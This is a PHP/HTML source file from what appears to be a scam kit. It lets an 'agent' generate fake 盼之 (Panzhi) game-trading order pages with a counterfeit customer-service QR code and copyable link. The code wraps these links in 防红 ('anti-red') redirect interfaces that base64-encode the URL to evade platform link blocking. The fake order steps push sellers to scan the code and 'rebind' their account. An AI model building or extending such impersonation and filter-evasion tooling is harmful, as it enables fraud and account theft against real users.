<?php
if (!defined('FROM_ROUTER')) {
    http_response_code(403);
    exit('喜乐科技@x60898');
}
session_start();
require_once $_SERVER['DOCUMENT_ROOT'] . '/config/dbconfig.php';
checkLogin();

$currentAgent = $_SESSION['username'];

function generateCustomerName($length = 6) {
    $characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

// 生成XEDATA令牌
function generateXEDataToken() {
    return md5(uniqid(mt_rand(), true));
}

// 创建会话记录到 XE-SKDJWKSNCDATA 表
function createChatSession($sessionId, $customerName, $agentAccount, $platform = '盼之') {
    $db = getDB();
    if (!$db) return false;
    
    $xedataToken = generateXEDataToken();
    $expiresAt = date('Y-m-d H:i:s', strtotime('+7 days'));
    
    $stmt = $db->prepare("INSERT INTO `XE-SKDJWKSNCDATA` 
                         (session_id, xedata_token, customer_name, agent_account, expires_at, platform) 
                         VALUES (?, ?, ?, ?, ?, ?)");
    $stmt->bind_param("ssssss", $sessionId, $xedataToken, $customerName, $agentAccount, $expiresAt, $platform);
    
    if ($stmt->execute()) {
        return $xedataToken;
    }
    return false;
}

$customerName = generateCustomerName();
$sessionId = 'a' . $customerName . 'z-p' . $currentAgent . 's';
// 生成XEDATA令牌并保存到数据库
$xedataToken = createChatSession($sessionId, $customerName, $currentAgent, '盼之');

$currentDomain = $_SERVER['HTTP_HOST'];
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
$baseUrl = $protocol . "://" . $currentDomain;
$originalServiceUrl = $baseUrl . '/' . "ChatPzds" . '?id=' . $sessionId;
// 添加XEDATA参数
if ($xedataToken) {
    $originalServiceUrl .= '&XEDATA=' . $xedataToken;
}

// 处理图片上传 - 修改上传目录为 /uploads/share/
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['image'])) {
    header('Content-Type: application/json');
    
    $response = ['success' => false, 'message' => '', 'url' => ''];
    
    $file = $_FILES['image'];
    $allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/jpg', 'image/webp'];
    $maxSize = 5 * 1024 * 1024; // 5MB
    
    if (!in_array($file['type'], $allowedTypes)) {
        $response['message'] = '只允许上传JPEG、PNG、GIF、WEBP格式的图片';
    } elseif ($file['size'] > $maxSize) {
        $response['message'] = '图片大小不能超过5MB';
    } else {
        // 修改上传目录为 /uploads/share/
        $uploadDir = $_SERVER['DOCUMENT_ROOT'] . '/uploads/share/';
        if (!is_dir($uploadDir)) {
            mkdir($uploadDir, 0777, true);
        }
        
        $fileName = uniqid() . '_' . preg_replace('/[^a-zA-Z0-9\.]/', '_', $file['name']);
        $filePath = $uploadDir . $fileName;
        
        if (move_uploaded_file($file['tmp_name'], $filePath)) {
            $response['success'] = true;
            $response['url'] = '/uploads/share/' . $fileName;  // 修改返回的URL路径
        } else {
            $response['message'] = '文件上传失败';
        }
    }
    
    echo json_encode($response);
    exit;
}

// 获取防红配置（修复版，调整优先级）
function getAntiRedConfig($username) {
     $db = getDB();
    if (!$db) return null;
    
    // 1. 首先检查防红开关是否开启
    $stmt = $db->prepare("SELECT apply_status FROM user_anti_red_config WHERE username = ?");
    $stmt->bind_param("s", $username);
    $stmt->execute();
    $result = $stmt->get_result();
    $config = $result->fetch_assoc();
    
    if (!$config) {
        // 如果没有配置记录，默认防红开关开启
        $apply_status = 'on';
    } else {
        $apply_status = $config['apply_status'];
    }
    
    // 如果防红开关关闭，直接返回null
    if ($apply_status === 'off') {
        return null;
    }
    
    // 2. 防红开关开启的情况下，检查session中是否有应用的接口（付费或免费）
    if (isset($_SESSION['applied_api_url']) && !empty($_SESSION['applied_api_url'])) {
        $type = $_SESSION['applied_domain_type'] ?? 'paid';
        $applied_domain = $_SESSION['applied_domain'] ?? '付费接口';
        
        return [
            'api_url' => $_SESSION['applied_api_url'],
            'apply_status' => 'on',
            'applied_domain' => $applied_domain,
            'encoding_mode' => 'base64',
            'type' => $type
        ];
    }
    
    // 3. 检查session中是否有自定义接口
    if (isset($_SESSION['custom_interface_url']) && !empty($_SESSION['custom_interface_url'])) {
        return [
            'api_url' => $_SESSION['custom_interface_url'],
            'apply_status' => 'on',
            'applied_domain' => isset($_SESSION['custom_interface_remark']) ? $_SESSION['custom_interface_remark'] : '自定义接口',
            'encoding_mode' => isset($_SESSION['custom_encoding_mode']) ? $_SESSION['custom_encoding_mode'] : 'base64',
            'type' => 'custom'
        ];
    }
    
    // 4. 从数据库查询用户配置
    if ($config['apply_status'] === 'on' && !empty($config['applied_domain'])) {
        $applied_domain = $config['applied_domain'];
        
        // 先尝试从免费接口表中查找
        $freeStmt = $db->prepare("SELECT api_url FROM freeantired WHERE name = ? AND status = 'active'");
        $freeStmt->bind_param("s", $applied_domain);
        $freeStmt->execute();
        $freeResult = $freeStmt->get_result();
        
        if ($freeResult->num_rows > 0) {
            // 是免费接口
            $freeData = $freeResult->fetch_assoc();
            $config['api_url'] = $freeData['api_url'];
            $config['type'] = 'free';
            $config['encoding_mode'] = 'base64';
            return $config;
        }
        
        // 再尝试从付费接口表中查找
        $paidStmt = $db->prepare("SELECT api_url FROM anti_red_links WHERE domain_name = ? AND sold_to = ?");
        $paidStmt->bind_param("ss", $applied_domain, $username);
        $paidStmt->execute();
        $paidResult = $paidStmt->get_result();
        
        if ($paidResult->num_rows > 0) {
            // 是付费接口
            $paidData = $paidResult->fetch_assoc();
            $config['api_url'] = $paidData['api_url'];
            $config['type'] = 'paid';
            $config['encoding_mode'] = 'base64';
            return $config;
        }
        
        // 如果都不是，检查是否是自定义接口（在 userantired 表中）
        $customStmt = $db->prepare("SELECT ua.api_url, ua.encoding 
                                    FROM userantired ua 
                                    JOIN users u ON ua.user_id = u.id 
                                    WHERE u.username = ? AND ua.remark = ? AND ua.status = 'active'");
        $customStmt->bind_param("ss", $username, $applied_domain);
        $customStmt->execute();
        $customResult = $customStmt->get_result();
        
        if ($customResult->num_rows > 0) {
            // 是自定义接口
            $customData = $customResult->fetch_assoc();
            $config['api_url'] = $customData['api_url'];
            $config['encoding_mode'] = $customData['encoding'] ?? 'base64';
            $config['type'] = 'custom';
            return $config;
        }
    }
    
    return null;
}

$antiRedConfig = getAntiRedConfig($currentAgent);
$serviceUrl = $originalServiceUrl;

// 读取源站URL配置
$db = getDB();
$webconfigResult = $db->query("SELECT site_url, site_url_enabled FROM webconfig ORDER BY id DESC LIMIT 1");
$siteUrlConfig = null;
if ($webconfigResult && $webconfigResult->num_rows > 0) {
    $siteUrlConfig = $webconfigResult->fetch_assoc();
}

if ($antiRedConfig && $antiRedConfig['apply_status'] === 'on' && !empty($antiRedConfig['api_url'])) {
    $encoding_mode = $antiRedConfig['encoding_mode'] ?? 'base64';
    
    // 根据编码模式处理URL
    switch ($encoding_mode) {
        case 'base64':
            $encodedUrl = base64_encode($originalServiceUrl);
            break;
        case 'urlencode':
        case 'url':
            $encodedUrl = urlencode($originalServiceUrl);
            break;
        case 'none':
        default:
            $encodedUrl = $originalServiceUrl;
            break;
    }
    
    $serviceUrl = $antiRedConfig['api_url'] . $encodedUrl;
    
    // 调试信息
    error_log("防红接口应用信息: " . json_encode([
        'type' => $antiRedConfig['type'] ?? 'unknown',
        'applied_domain' => $antiRedConfig['applied_domain'] ?? 'unknown',
        'api_url' => $antiRedConfig['api_url'],
        'encoding_mode' => $encoding_mode,
        'original_url' => $originalServiceUrl,
        'encoded_url' => $encodedUrl,
        'final_url' => $serviceUrl
    ]));
} elseif ($siteUrlConfig && !empty($siteUrlConfig['site_url_enabled']) && !empty($siteUrlConfig['site_url'])) {
    $serviceUrl = $siteUrlConfig['site_url'] . base64_encode($originalServiceUrl);
}

// 输出调试信息（开发环境中使用）
if (isset($_GET['debug'])) {
    echo "<!-- 防红配置信息: " . json_encode($antiRedConfig) . " -->\n";
    echo "<!-- 原始URL: $originalServiceUrl -->\n";
    echo "<!-- 最终URL: $serviceUrl -->\n";
    echo "<!-- Session状态: " . json_encode([
        'custom_interface_url' => $_SESSION['custom_interface_url'] ?? '未设置',
        'custom_encoding_mode' => $_SESSION['custom_encoding_mode'] ?? '未设置',
        'custom_interface_remark' => $_SESSION['custom_interface_remark'] ?? '未设置',
        'applied_api_url' => $_SESSION['applied_api_url'] ?? '未设置',
        'applied_domain' => $_SESSION['applied_domain'] ?? '未设置',
        'applied_domain_type' => $_SESSION['applied_domain_type'] ?? '未设置',
        'redirect_to_browser' => $_SESSION['redirect_to_browser'] ?? '未设置'
    ]) . " -->\n";
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>分享页</title>
	
	<link rel="stylesheet" href="/assets/bootstrap-icons.css">
    <link rel="stylesheet" href="/assets/SharePhoto/main.css">
    <link rel="stylesheet" href="/assets/SharePhoto/panzhi.css">
    <style>
        .panzhi-preview {
    max-height: calc(100% + 1px);
    min-height: calc(100% + 1px);
    max-width: 100%;
    min-width: 100%;
    position: relative;
    overflow: hidden;
}
    </style>
</head>
<body>
    <div id="app" data-v-app="">
		<div class="app-container">
			<div class="scroll-container">
				<div class="form-container">
					
					 <div class="form-row">
                    <label>防红</label>
                    <a class="form-link anti-red-link" id="anti-red-status">
                            <?php 
                            if ($antiRedConfig && $antiRedConfig['apply_status'] === 'on') {
                                echo '已配置 (' . $antiRedConfig['applied_domain'] . ')';
                            } else {
                                echo '未配置';
                            }
                            ?> </a>
                         <!-- 移除刷新按钮 -->
                    <div class="copy-link-btn" id="copy-link-btn">
                        <svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="18" height="18">
                            <path
                                d="M761.088 715.3152a38.7072 38.7072 0 0 1 0-77.4144 37.4272 37.4272 0 0 0 37.4272-37.4272V265.0112a37.4272 37.4272 0 0 0-37.4272-37.4272H425.6256a37.4272 37.4272 0 0 0-37.4272 37.4272 38.7072 38.7072 0 1 1-77.4144 0 115.0976 115.0976 0 0 1 114.8416-114.8416h335.4624a115.0976 115.0976 0 0 1 114.8416 114.8416v335.4624a115.0976 115.0976 0 0 1-114.8416 114.8416z"
                                p-id="5993" fill="#515151"></path>
                            <path
                                d="M589.4656 883.0976H268.1856a121.1392 121.1392 0 0 1-121.2928-121.2928v-322.56a121.1392 121.1392 0 0 1 121.2928-121.344h321.28a121.1392 121.1392 0 0 1 121.2928 121.2928v322.56c1.28 67.1232-54.1696 121.344-121.2928 121.344zM268.1856 395.3152a43.52 43.52 0 0 0-43.8784 43.8784v322.56a43.52 43.52 0 0 0 43.8784 43.8784h321.28a43.52 43.52 0 0 0 43.8784-43.8784v-322.56a43.52 43.52 0 0 0-43.8784-43.8784z"
                                p-id="5994" fill="#515151"></path>
                        </svg>
                        <div>复制链接</div>
                    </div>
                </div>
                <div class="form-row">
						<label>模版</label>
						<select id="template-select">
							<option value="old">老款2025</option>
							<option value="new">新款2026</option>
						</select>
					</div>
					<div class="form-row" id="kefukind-row" style="display: none;">
						<label>客服类型</label>
						<select id="kefukind-select">
							<option value="1">交易专员</option>
							<option value="2">售后专员</option>
							<option value="3">下单专员</option>
						</select>
					</div>
					<div class="form-row">
						<label>标题</label>
						<input type="text" id="title-input">
					</div>
					<div class="form-row">
						<label>价格</label>
						<input type="text" id="price-input" placeholder="输入金额">
					</div>
					<div class="form-row">
						<label>扫码</label>
						<select id="pay-select">
							<option value="微信">微信(推荐)</option>
							<option value="支付宝">支付宝</option>
							<option value="QQ">QQ</option>
							<option value="百度">百度</option>
							<option value="浏览器">浏览器</option>
						</select>
					</div>
					<!-- 新增客服名称输入行 -->
					<div class="form-row">
						<label>客服名称</label>
						<input type="text" id="customer-service-input" value="喜乐">
					</div>
					<div class="form-row">
						<label>订单状态</label>
						<select id="order-status-select">
							<option value="进行中">进行中</option>
							<option value="待付款">待付款</option>
							<option value="已完成">已完成</option>
							<option value="已取消">已取消</option>
						</select>
					</div>
					<div class="form-row">
						<label>封面图</label>
						<label for="upload-cover" class="form-link" id="upload-label">上传图片</label>
						<input type="file" accept="image/*" id="upload-cover" style="display: none;">
					</div>
					
					    
    <!-- 开启订单开关 -->
    <div class="form-row" id="order-switch-row" style="padding: 16px 16px 16px;">
        <label>是否生成订单</label>
        <div class="switch-container">
            <label class="toggle-switch disabled" id="switch-container">
                <input type="checkbox" id="order-switch" disabled>
                <span class="switch-slider"></span>
            </label>
        </div>
    </div>
				</div>
				<!-- 预览区域开始 -->
				<div class="panzhi-preview">
					<div class="order-status-container" id="preview-container">
						<!-- 状态进度条卡片 -->
						<div class="status-card" id="status-card">
							<div class="status-header">已下单，等待卖家联系客服</div>
							<div class="status-progress-container">
								<div class="status-progress-wrapper">
									<!-- 进度条轨道 -->
									<div class="status-progress-track"></div>
									
									<!-- 进度条填充 -->
									<div class="status-progress-fill"></div>
									
									<!-- 步骤点 -->
									<div class="status-steps">
										<div class="status-step">
											<div class="status-step-circle active"></div>
											<div class="status-step-text">已付款</div>
										</div>
										<div class="status-step">
											<div class="status-step-circle"></div>
											<div class="status-step-text">联系客服</div>
										</div>
										<div class="status-step">
											<div class="status-step-circle"></div>
											<div class="status-step-text">客服核号</div>
										</div>
										<div class="status-step">
											<div class="status-step-circle"></div>
											<div class="status-step-text">换绑账号</div>
										</div>
										<div class="status-step">
											<div class="status-step-circle"></div>
											<div class="status-step-text">完成交易</div>
										</div>
									</div>
								</div>
							</div>
						</div>
						
						<!-- 联系客服卡片 -->
						<div class="status-card">
							<div class="contact-section">
								<div class="contact-info">
									<h2 class="contact-title">联系客服</h2>
									<p class="contact-detail">客服：<span class="contact-name">盼之客服-<span id="preview-customer-service">喜乐</span></span></p>
									<p class="contact-detail" id="contact-method-text">请提醒卖家<span class="contact-method" id="preview-pay-method">微信</span>扫码处理</p>
									<p class="contact-tip">为保障您的交易安全，请勿将此二维码泄露给他人</p>
								</div>
								<div class="qr-code-container">
									<div class="qr-code-wrapper" id="qrcode-preview">
										<!-- 二维码将在这里生成 -->
									</div>
								</div>
							</div>
						</div>
						
						<!-- 商品信息卡片 -->
						<div class="status-card">
							<div class="product-info">
								<div style="display: flex; align-items: center; gap: 12px;">
									<div class="product-image-container" id="preview-image-container">
										<!-- 商品图片将在这里显示 -->
									</div>
									<div class="product-details">
										<div class="product-title" id="preview-product-title">商品标题</div>
									</div>
								</div>
								<div class="product-price-section">
									<div class="product-price" id="preview-product-price">¥0.00</div>
									<div class="product-status" id="preview-order-status">进行中</div>
								</div>
							</div>
							<div class="price-details">
								<div class="price-row">
									<span>商品总价</span>
									<span class="price-value" id="preview-total-price">¥0.00</span>
								</div>
								<div class="price-row">
									<span>订单编号</span>
									<span class="price-value" id="preview-order-number"></span>
								</div>
								<div class="price-row">
									<span>总价</span>
									<span class="price-value" id="preview-final-price">¥0.00</span>
								</div>
							</div>
						</div>
						
						<!-- 底部横幅 -->
						<div class="status-card bottom-banner">
							<img src="/assets/img/pzhengfu.png" alt="盼之代售服务" class="banner-img">
						</div>
					</div>
				</div>
				<!-- 预览区域结束 -->
			</div>
		</div>
	</div>
	<!-- 在页面底部添加Toast消息容器 -->
<div id="message-toast" class="message-toast"></div>

<script src="/assets/qrcode.min.js"></script>
<script src="/assets/qrcode-helper.js"></script>
<script>
// 全局变量声明
var qrCodeUrl = "<?php echo $serviceUrl; ?>";
var baseUrl = "<?php echo $baseUrl; ?>";
var imageLink = "";
var isOrderEnabled = false;
var currentTemplate = "old";
var currentKefukind = "1";
var orderParams = {
    title: "",
    rmb: "",
    img: ""
};

// 不依赖DOM元素的函数放在外面
function generateOrderNumber() {
    var chars = '0123456789';
    var result = '';
    for (var i = 0; i < 12; i++) {
        result += chars[Math.floor(Math.random() * chars.length)];
    }
    return result;
}

function showToast(message, type) {
    var container = document.getElementById('notification-container');
    if (!container) {
        container = document.createElement('div');
        container.id = 'notification-container';
        container.className = 'notification-container';
        document.body.appendChild(container);
    }

    var toast = document.createElement('div');
    toast.className = 'new-user-toast notification-enter-active';
    if (type) {
        toast.classList.add(type);
    }

    var icon = document.createElement('div');
    icon.className = 'toast-icon';
    icon.textContent = type === 'error' ? '!' : '✓';
    toast.appendChild(icon);

    var text = document.createElement('div');
    text.className = 'toast-text';
    text.textContent = message;
    toast.appendChild(text);

    var closeBtn = document.createElement('button');
    closeBtn.className = 'toast-close';
    closeBtn.innerHTML = '&times;';
    closeBtn.addEventListener('click', function() {
        removeToast(toast);
    });
    toast.appendChild(closeBtn);

    container.appendChild(toast);

    setTimeout(function() {
        toast.classList.add('notification-leave-active');
        setTimeout(function() {
            removeToast(toast);
        }, 300);
    }, 4000);

    function removeToast(toast) {
        if (toast.parentNode) {
            toast.parentNode.removeChild(toast);
        }
    }
}

function copyToClipboard(text) {
    return new Promise(function(resolve, reject) {
        if (navigator.clipboard && window.isSecureContext) {
            navigator.clipboard.writeText(text).then(() => {
                resolve(true);
            }).catch(err => {
                console.error('复制失败:', err);
                fallbackCopy(text, resolve, reject);
            });
        } else {
            fallbackCopy(text, resolve, reject);
        }
    });
}

function fallbackCopy(text, resolve, reject) {
    var textArea = document.createElement("textarea");
    textArea.value = text;
    textArea.style.position = "fixed";
    textArea.style.left = "-999999px";
    textArea.style.top = "-999999px";
    document.body.appendChild(textArea);
    textArea.focus();
    textArea.select();
    try {
        var successful = document.execCommand('copy');
        document.body.removeChild(textArea);
        resolve(successful);
    } catch (err) {
        console.error('复制失败:', err);
        document.body.removeChild(textArea);
        resolve(false);
    }
}

// 页面加载完成后执行
document.addEventListener('DOMContentLoaded', function() {
    console.log('页面加载完成，开始初始化...');
    
    // 获取DOM元素
    var titleInput = document.getElementById('title-input');
    var priceInput = document.getElementById('price-input');
    var paySelect = document.getElementById('pay-select');
    var customerServiceInput = document.getElementById('customer-service-input');
    var orderStatusSelect = document.getElementById('order-status-select');
    var uploadCover = document.getElementById('upload-cover');
    var uploadLabel = document.getElementById('upload-label');
    var copyLinkBtn = document.getElementById('copy-link-btn');
    
    // 订单开关相关元素
    var orderSwitch = document.getElementById('order-switch');
    var switchContainer = document.getElementById('switch-container');
    
    // 预览元素
    var previewOrderNumber = document.getElementById('preview-order-number');
    
    // 初始化订单号
    var initialOrderNumber = generateOrderNumber();
    if (previewOrderNumber) {
        previewOrderNumber.textContent = initialOrderNumber;
    }
    
    // 内部函数定义
    function checkRequiredFields() {
        var title = titleInput ? titleInput.value.trim() : '';
        var price = priceInput ? priceInput.value.trim() : '';
        var hasImage = imageLink !== '';
        
        console.log('检查必填项:', {
            title: title,
            price: price,
            hasImage: hasImage
        });
        
        return title !== '' && price !== '' && hasImage;
    }
    
    function getMissingFields() {
        var missingFields = [];
        var title = titleInput ? titleInput.value.trim() : '';
        var price = priceInput ? priceInput.value.trim() : '';
        var hasImage = imageLink !== '';
        
        if (!title) missingFields.push('标题');
        if (!price) missingFields.push('价格');
        if (!hasImage) missingFields.push('封面图');
        
        console.log('缺少的字段:', missingFields);
        return missingFields;
    }
    
    function updateSwitchState() {
        var allFieldsFilled = checkRequiredFields();
        
        if (allFieldsFilled) {
            // 所有必填项都已填写，启用开关
            if (orderSwitch) {
                orderSwitch.disabled = false;
            }
            if (switchContainer) {
                switchContainer.classList.remove('disabled');
            }
            console.log('开关已启用');
        } else {
            // 有必填项未填写，禁用开关并关闭
            if (orderSwitch) {
                orderSwitch.disabled = true;
                orderSwitch.checked = false;
            }
            if (switchContainer) {
                switchContainer.classList.add('disabled');
            }
            console.log('开关已禁用');
            
            // 如果开关之前是开启的，现在关闭了，需要更新二维码
            if (isOrderEnabled) {
                isOrderEnabled = false;
                updateQRCodeWithOrder();
            }
        }
    }
    
    function updateQRCode(qrText) {
        var qrcodeContainer = document.getElementById("qrcode-preview");
        if (!qrcodeContainer) {
            console.log('没有找到二维码容器');
            return;
        }
        
        // 确保有链接内容
        if (!qrText || qrText.trim() === '') {
            qrText = "<?php echo $originalServiceUrl; ?>";
        }
        
        console.log('生成二维码，链接:', qrText);
        
        // 清空现有二维码
        qrcodeContainer.innerHTML = '';
        
        // 使用qrcode.js生成二维码
        try {
            new QRCode(qrcodeContainer, {
                text: qrText,
                width: getQRSize(qrText, 100),
                height: getQRSize(qrText, 100),
                colorDark: "#000000",
                colorLight: "#ffffff",
                correctLevel: getQRCorrectLevel(qrText)
            });
        } catch(e) {
            console.error('QR码生成失败，尝试降级:', e);
            try {
                qrcodeContainer.innerHTML = '';
                new QRCode(qrcodeContainer, {
                    text: qrText,
                    width: 140,
                    height: 140,
                    colorDark: "#000000",
                    colorLight: "#ffffff",
                    correctLevel: QRCode.CorrectLevel.L
                });
            } catch(e2) {
                qrcodeContainer.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;width:100px;height:100px;background:#f5f5f5;border-radius:8px;color:#999;font-size:12px;text-align:center;padding:10px;">二维码生成失败</div>';
            }
        }
        
        // 添加盼之logo
        var logo = document.createElement('div');
        logo.className = 'qr-logo';
        var logoImg = document.createElement('img');
        logoImg.src = '/assets/img/pzqr.png';
        logoImg.alt = '盼之客服';
        logo.appendChild(logoImg);
        qrcodeContainer.appendChild(logo);
    }
    
    function getCurrentUrl() {
        var baseServiceUrl = "<?php echo $baseUrl; ?>";
        
        // 根据模版选择路径
        var chatPath = currentTemplate === 'new' ? '/ChatPzds2' : '/ChatPzds';
        var qrText = baseServiceUrl + chatPath + '?id=<?php echo $sessionId; ?>';
        
        // 添加XEDATA参数
        <?php if ($xedataToken): ?>
        qrText += '&XEDATA=<?php echo $xedataToken; ?>';
        <?php endif; ?>
        
        console.log('基础链接:', qrText);
        
        // 构建参数数组
        var params = [];
        
        // 新款模版时添加kefukind参数
        if (currentTemplate === 'new') {
            params.push('kefukind=' + currentKefukind);
        }
        
        // 添加客服名称参数（pzkefu）
        var customerService = customerServiceInput ? customerServiceInput.value.trim() : '';
        if (customerService) {
            params.push('pzkefu=' + encodeURIComponent(customerService));
        }
        
       if (isOrderEnabled && checkRequiredFields()) {
            // 获取当前表单值
            orderParams.title = titleInput ? titleInput.value.trim() : '';
            orderParams.rmb = priceInput ? priceInput.value.trim() : '';
            orderParams.img = imageLink || '';
            
            console.log('订单参数:', orderParams);
            
            // 构建订单参数 - 只添加有值的参数
            if (orderParams.title) params.push('title=' + encodeURIComponent(orderParams.title));
            if (orderParams.rmb) params.push('rmb=' + encodeURIComponent(orderParams.rmb));
            if (orderParams.img) params.push('img=' + encodeURIComponent(orderParams.img));
        }
         if (params.length > 0) {
            var separator = qrText.includes('?') ? '&' : '?';
            qrText = qrText + separator + params.join('&');
        }
        
        // 处理防红链接和源站URL跳转
        <?php if ($antiRedConfig && $antiRedConfig['apply_status'] === 'on' && !empty($antiRedConfig['api_url'])): ?>
            var antiRedApiUrl = "<?php echo $antiRedConfig['api_url']; ?>";
            qrText = antiRedApiUrl + btoa(unescape(encodeURIComponent(qrText)));
        <?php elseif ($siteUrlConfig && !empty($siteUrlConfig['site_url_enabled']) && !empty($siteUrlConfig['site_url'])): ?>
            var siteUrl = "<?php echo $siteUrlConfig['site_url']; ?>";
            qrText = siteUrl + btoa(unescape(encodeURIComponent(qrText)));
        <?php endif; ?>
        
        console.log('最终链接:', qrText);
        return qrText;
    }
    
    function updateQRCodeWithOrder() {
        var qrText = getCurrentUrl();
        updateQRCode(qrText);
        return qrText;
    }
    
    // 1. 更新开关状态
    updateSwitchState();
    
    // 模版切换监听
    var templateSelect = document.getElementById('template-select');
    var kefukindRow = document.getElementById('kefukind-row');
    var kefukindSelect = document.getElementById('kefukind-select');
    
    if (templateSelect) {
        templateSelect.addEventListener('change', function() {
            currentTemplate = this.value;
            if (currentTemplate === 'new') {
                kefukindRow.style.display = '';
            } else {
                kefukindRow.style.display = 'none';
            }
            updateQRCodeWithOrder();
        });
    }
    
    if (kefukindSelect) {
        kefukindSelect.addEventListener('change', function() {
            currentKefukind = this.value;
            updateQRCodeWithOrder();
        });
    }
    
    // 2. 处理开关点击事件
    if (orderSwitch && switchContainer) {
        console.log('绑定开关事件...');
        
        // 为整个开关容器添加点击事件
        switchContainer.addEventListener('click', function(e) {
            console.log('开关容器被点击，开关状态:', orderSwitch.disabled ? '禁用' : '启用');
            
            // 如果开关是禁用的
            if (orderSwitch.disabled) {
                console.log('开关是禁用状态');
                e.preventDefault();
                e.stopPropagation();
                
                // 阻止开关状态改变
                orderSwitch.checked = false;
                
                // 检查缺少的字段
                var missingFields = getMissingFields();
                if (missingFields.length > 0) {
                    var message = '请先填写' + missingFields.join('、');
                    showToast(message, 'error');
                    console.log('显示toast提示:', message);
                }
                return false;
            }
        });
        
        // 开关状态变化监听
        orderSwitch.addEventListener('change', function() {
            console.log('开关状态变化:', this.checked);
            
            if (this.disabled) {
                console.log('开关是禁用的，不处理change事件');
                return;
            }
            
            isOrderEnabled = this.checked;
            updateQRCodeWithOrder();
            
            // 显示开关状态消息
            if (isOrderEnabled) {
                showToast('订单生成功能已开启', 'success');
            } else {
                showToast('订单生成功能已关闭', 'error');
            }
        });
    }
    
    // 3. 标题输入监听
    if (titleInput) {
        titleInput.addEventListener('input', function() {
            var productTitle = document.getElementById('preview-product-title');
            if (productTitle) {
                productTitle.textContent = this.value || '商品标题';
            }
            orderParams.title = this.value;
            
            updateSwitchState();
            updateQRCodeWithOrder();
        });
    }
    
    // 4. 价格输入监听
    if (priceInput) {
        priceInput.addEventListener('input', function() {
            var price = this.value;
            var priceNum = parseFloat(price) || 0;
            var formattedPrice = '¥' + priceNum.toLocaleString('zh-CN', {minimumFractionDigits: 2, maximumFractionDigits: 2});
            
            var previewProductPrice = document.getElementById('preview-product-price');
            var previewTotalPrice = document.getElementById('preview-total-price');
            var previewFinalPrice = document.getElementById('preview-final-price');
            
            if (previewProductPrice) {
                previewProductPrice.textContent = formattedPrice;
            }
            if (previewTotalPrice) {
                previewTotalPrice.textContent = formattedPrice;
            }
            if (previewFinalPrice) {
                previewFinalPrice.textContent = formattedPrice;
            }
            
            orderParams.rmb = price;
            
            updateSwitchState();
            updateQRCodeWithOrder();
        });
    }
    
   // 5. 客服名称输入监听
    if (customerServiceInput) {
        customerServiceInput.addEventListener('input', function() {
            var previewCustomerService = document.getElementById('preview-customer-service');
            if (previewCustomerService) {
                previewCustomerService.textContent = this.value || '喜乐';
            }
            updateQRCodeWithOrder();
        });
    }
    
    // 6. 订单状态选择监听
    if (orderStatusSelect) {
        orderStatusSelect.addEventListener('change', function() {
            var previewOrderStatus = document.getElementById('preview-order-status');
            if (previewOrderStatus) {
                previewOrderStatus.textContent = this.value;
            }
        });
    }
    
    // 7. 支付方式监听
    if (paySelect) {
        paySelect.addEventListener('change', function() {
            var previewPayMethod = document.getElementById('preview-pay-method');
            if (previewPayMethod) {
                previewPayMethod.textContent = this.value;
            }
        });
    }
    
    // 8. 图片上传监听
    if (uploadCover) {
        uploadCover.addEventListener('change', function(e) {
            var file = e.target.files[0];
            if (file) {
                if (uploadLabel) {
                    uploadLabel.textContent = '上传中...';
                }
                
                var formData = new FormData();
                formData.append('image', file);
                
                var xhr = new XMLHttpRequest();
                xhr.open('POST', window.location.href, true);
                
                xhr.onload = function() {
                    if (xhr.status === 200) {
                        try {
                            var response = JSON.parse(xhr.responseText);
                            if (response.success) {
                                imageLink = response.url;
                                orderParams.img = imageLink;
                                
                                // 更新预览图片
                                var previewImageContainer = document.getElementById('preview-image-container');
                                if (previewImageContainer) {
                                    previewImageContainer.innerHTML = '';
                                    var img = document.createElement('img');
                                    img.src = response.url;
                                    img.style.width = '100%';
                                    img.style.height = '100%';
                                    img.style.objectFit = 'cover';
                                    previewImageContainer.appendChild(img);
                                }
                                
                                if (uploadLabel) {
                                    uploadLabel.textContent = '已上传';
                                }
                                
                                updateSwitchState();
                                updateQRCodeWithOrder();
                                showToast('图片上传成功', 'success');
                            } else {
                                if (uploadLabel) {
                                    uploadLabel.textContent = '上传图片';
                                }
                                showToast('上传失败: ' + response.message, 'error');
                            }
                        } catch (e) {
                            console.error('解析响应失败:', e);
                            if (uploadLabel) {
                                uploadLabel.textContent = '上传图片';
                            }
                            showToast('上传失败', 'error');
                        }
                    } else {
                        if (uploadLabel) {
                            uploadLabel.textContent = '上传图片';
                        }
                        showToast('上传失败，服务器错误', 'error');
                    }
                };
                
                xhr.onerror = function() {
                    if (uploadLabel) {
                        uploadLabel.textContent = '上传图片';
                    }
                    showToast('上传失败，网络错误', 'error');
                };
                
                xhr.send(formData);
            }
        });
    }
    
    // 9. 复制链接按钮监听
    if (copyLinkBtn) {
        copyLinkBtn.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            
            var linkToCopy = getCurrentUrl();
            
            console.log('复制链接:', linkToCopy);
            
            // 检查链接是否为空
            if (!linkToCopy || linkToCopy.trim() === '') {
                showToast('链接为空，无法复制', 'error');
                return;
            }
            
            copyToClipboard(linkToCopy).then(success => {
                if (success) {
                    showToast('链接已复制到剪贴板', 'success');
                } else {
                    showToast('复制失败，请手动复制', 'error');
                }
            });
        });
    }
    
    // 初始生成二维码
    var initialQrText = qrCodeUrl;
    if (!initialQrText || initialQrText.trim() === '') {
        initialQrText = "<?php echo $originalServiceUrl; ?>";
    }
    updateQRCode(initialQrText);
    
    console.log('初始化完成');
});
</script>

</body>
</html>